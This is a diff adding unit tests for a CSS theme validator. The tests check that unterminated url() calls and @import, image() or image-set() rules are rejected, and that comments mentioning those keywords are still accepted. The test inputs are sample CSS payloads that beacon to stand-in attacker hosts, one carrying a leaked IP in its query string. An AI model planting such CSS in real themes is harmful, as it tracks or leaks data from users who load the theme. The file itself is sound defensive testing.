@@ -105,6 +105,35 @@ describe('validateThemeCss', () => {
     expect(result.errors[0]).toMatch(/Line 3/);
   });
 
+  // --- Unterminated url()/src() at end-of-input ---
+
+  it('rejects an unterminated url( at end-of-input (fetches as a url-token)', () => {
+    // The CSS tokenizer emits a fetchable url-token at EOF even without the
+    // closing `)`, so a theme that simply ends mid-url beacons on every load.
+    // The argument regex needs the `)`, so this must be caught separately.
+    for (const css of [
+      'body{background-image:url(http://evil/beacon?ip=leak',
+      'body{background-image:url("http://evil/q',
+      'a{background:url("http://evil/q"',
+      '@font-face{src:src(http://evil/x',
+    ]) {
+      const result = validateThemeCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.errors.join(' ')).toMatch(/unterminated/i);
+    }
+  });
+
+  it('still accepts a normally-closed url() near end-of-input', () => {
+    expect(validateThemeCss('rect{fill:url(#g)}').isValid).toBe(true);
+    expect(validateThemeCss('a{background:url(#g)}').isValid).toBe(true);
+  });
+
+  it('reports the line of an unterminated url( that is not at the first line', () => {
+    const result = validateThemeCss(':root {}\n\nbody{background:url(http://evil/x');
+    expect(result.isValid).toBe(false);
+    expect(result.errors[0]).toMatch(/Line 3/);
+  });
+
   // --- CSS escape bypass tests (C1) ---
 
   it('rejects \\75rl(...) — `url` with escaped first char', () => {
@@ -363,6 +392,31 @@ describe('validateThemeCss', () => {
       'a { background: image-set(linear-gradient(red, blue) 1x); }',
     );
     expect(result.isValid).toBe(false);
+  });
+
+  // --- Keyword bans are exempt inside comments (but not strings) ---
+
+  it('allows @import / image() / image-set() keyword text inside comments', () => {
+    // These bans have no fetchable argument to classify, so a genuine comment
+    // mentioning them (e.g. a theme documenting the restriction) is not a rule
+    // and must not eject the theme on install or on re-validation at load.
+    for (const css of [
+      '/* do not use @import in themes */ body{--surface-1:#000}',
+      '/* pick an image (large) then crop */ body{--surface-1:#000}',
+      '/* image-set() is unsupported here */ body{--surface-1:#000}',
+    ]) {
+      expect(validateThemeCss(css).isValid).toBe(true);
+    }
+  });
+
+  it('still rejects real @import / image() / image-set() sitting next to a comment', () => {
+    for (const css of [
+      '/* note */ @import "https://evil.example/x.css";',
+      '/* note */ a{background:image("https://evil.example/x.png")}',
+      '/* note */ a{background:image-set("https://evil.example/x.png" 1x)}',
+    ]) {
+      expect(validateThemeCss(css).isValid).toBe(false);
+    }
   });
 
   // --- THEME_CONTRACT presence-only warning tests ---
